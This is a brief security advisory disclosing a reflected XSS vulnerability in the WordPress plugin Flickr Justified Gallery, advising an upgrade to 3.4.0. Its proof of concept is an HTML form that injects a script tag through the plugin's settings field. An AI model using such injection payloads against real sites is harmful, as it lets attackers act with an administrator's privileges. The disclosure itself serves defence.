Description
================
Reflected XSS in Flickr Justified Gallery could allows unauthenticated attackers to do almost anything an admin can do

Vulnerability
================
This plugin contains a reflected XSS vulnerability which would allow an unauthenticated attacker to do almost anything an admin user can do.
For this to happen, the administrator would have to be tricked into clicking on a link controlled by the attacker. It is easy to make these links very convincing.

Proof of concept
================
Visit a page containing the following in Firefox or any other browser with no reflected XSS mitigation strategies, and click submit:
<form action=\"http://localhost/wp-admin/options-general.php?page=fjgwpp.php\" method=\"POST\">
<input type=\"text\" name=\"fjgwpp_userID\" value=\":"><script>alert(1)</script>\">
<input type=\"text\" name=\"Submit\" value=\"Save Changes\">
<input type=\"submit\">
</form>

Mitigations
================
Upgrade to version 3.4.0 or later
